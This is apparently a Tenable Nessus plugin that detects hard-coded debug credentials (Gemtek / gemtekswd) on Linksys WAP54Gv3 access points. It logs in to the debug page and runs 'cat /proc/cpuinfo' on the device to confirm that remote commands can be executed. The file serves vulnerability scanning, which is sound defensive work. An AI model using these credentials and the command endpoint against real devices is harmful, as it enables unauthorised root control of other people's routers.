#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

# Vulnerable:
# Linksys WAP54Gv3 3.4.3.(US)
# Linksys WAP54Gv3 3.5.3.(Europe)

if(description)
{
  script_id(49646);
  script_version ("$Revision: 1.13 $");
  script_cvs_date("$Date: 2017/05/16 19:43:12 $");

  script_cve_id("CVE-2010-1573");
  script_bugtraq_id(40648);
  script_osvdb_id(65269);

  script_name(english: "Linksys Router Debug Credentials (Gemtek / gemtekswd)");
  script_summary(english: "Tests for the linksys default account");
 
  script_set_attribute(attribute:"synopsis", value:
"It is possible to log on the remote device with a default password.");
  script_set_attribute(attribute:"description", value:
"The remote Linksys device accepts hard-coded default credentials
(Gemtek / gemtekswd) on a debug page. 

An attacker can run arbitrary commands on this device using this
account. 

This flaw is known to affect two firmware versions :

  - Linksys WAP54Gv3 3.4.3.(US)
  - Linksys WAP54Gv3 3.5.3.(Europe)"
  );
  # http://www.icysilence.org/wp-content/uploads/IS-2010-002_Linksys_WAP54Gv3_Remote_Debug_Root_Shell.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5d5ffb8d");
  script_set_attribute(attribute:"see_also", value:"http://www.icysilence.org/?p=268");
  script_set_attribute(attribute:"see_also", value:"https://tools.cisco.com/security/center/viewAlert.x?alertId=20682");
  script_set_attribute(attribute:"see_also", value:"http://downloads.linksysbycisco.com/downloads/wap54g_fw_ver30806.txt");
  script_set_attribute(attribute:"solution", value: 
"This debug account cannot be disabled.  Contact the vendor and ask
about a firmware upgrade.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(
    259,	# Use of Hard-coded Password
    798,	# Use of Hard-coded Credentials
    724,	# OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management
    753,	# 2009 Top 25 - Porous Defenses
    803		# 2010 Top 25 - Porous Defenses
  );
  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/h:linksys:wap54gv3:3.05.03");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CISCO");

  script_copyright("This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

# The script code starts here
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

login = "Gemtek";
pass  = "gemtekswd";

port = get_http_port(default:80, embedded:TRUE);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if (! thorough_tests && report_paranoia < 2)
{
  b = http_get_cache(port: port, item: "/", exit_on_fail: TRUE);
  # This string appears on the WWW-Authenticate line 
  if ("Linksys WAP54G" >!< b)
    exit(0, "The web server on port "+port+" is not a WAP54G AP.");
}

if (thorough_tests)
  url_l = make_list("/debug.cgi", "/Debug_command_page.asp");
else
  url_l = make_list("/debug.cgi");

foreach u (url_l)
{
  w = http_send_recv3(port: port, method: 'GET', item: u,
        username: "", password: "", exit_on_fail: TRUE);
  if (w[0] !~  "^HTTP/[01.]+ 401 ") continue;
  if ('WWW-Authenticate: Basic realm="Linksys WAP54G"' >!< w[1]) break;

  w =  http_send_recv3(port: port, method: 'GET', item: u,
        username: login, password: pass, exit_on_fail: TRUE, follow_redirect:2);
  if (w[0] !~ "^HTTP/[01.]+ 200 ") continue;
  if ( report_paranoia > 1 ||
       ('<form method="post" action=' >< w[2] && 
        '<input type="text" name="data1" ' >< w[2]) )
  {
    report = '\nClicking on this URL will demonstrate the flaw :\n\n' +
      build_url(port: port, qs: u, username: login, password: pass) + '\n';
    if (report_verbosity > 0 || report_paranoia < 1)
    {
      h = make_array('Referer', build_url(port: port, qs: u));
      w = http_send_recv3(port: port, method: 'POST', item: u,
      	add_headers: h, username: login, password: pass, 
	data: 'data1=cat /proc/cpuinfo', 
	content_type: 'application/x-www-form-urlencoded',
	exit_on_fail: TRUE, follow_redirect: 2);
      if (isnull(w) || w[0] !~ "^HTTP/[01.]+ 200 ") continue;
      txt = w[2];
      i = stridx(txt, "<textarea");
      if (i >= 0)
      {
        txt = substr(txt, i);
	i = stridx(txt, '\n');
	if (i > 0) txt = substr(txt, i + 1);
	i = stridx(txt, "</textarea");
	if (i >= 0) txt = substr(txt, 0, i - 1);
      }
      report = report + 
  '\nIt was possible to run \'cat /proc/cpuinfo\' on the device :\n\n' +
  txt + '\n';
      security_hole(port: port, extra: report);
    }
    else
      security_hole(port: port, extra: report);
    exit(0);
  }
}
exit(0, "The web server on port "+port+" is unaffected.");
